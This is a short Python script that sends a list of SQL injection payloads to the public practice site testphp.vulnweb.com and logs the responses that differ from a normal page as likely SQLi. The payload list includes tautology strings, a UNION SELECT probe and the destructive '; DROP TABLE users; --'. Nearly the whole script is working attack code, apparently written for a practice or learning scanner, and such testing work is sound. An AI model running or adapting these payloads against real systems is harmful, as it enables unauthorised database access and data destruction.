import requests
import json
import difflib

TARGET = "http://testphp.vulnweb.com/artists.php?artist="
PAYLOADS = ["' OR '1'='1", "' OR 1=1--", "; DROP TABLE users; --", "' OR 'a'='a", "' UNION SELECT null,null--", "' AND 1=2--"]

resultados = []
original = requests.get(TARGET + "test").text

for payload in PAYLOADS:
    url = TARGET + payload
    res = requests.get(url)
    delta = difflib.SequenceMatcher(None, original, res.text).ratio()
    if delta < 0.95:
        resultados.append({"tipo": "SQLi", "url": url, "payload": payload})

with open("sqli_results.json", "w") as f:
    json.dump(resultados, f, indent=4)

print("[+] SQLi test completado. Resultados en sqli_results.json")
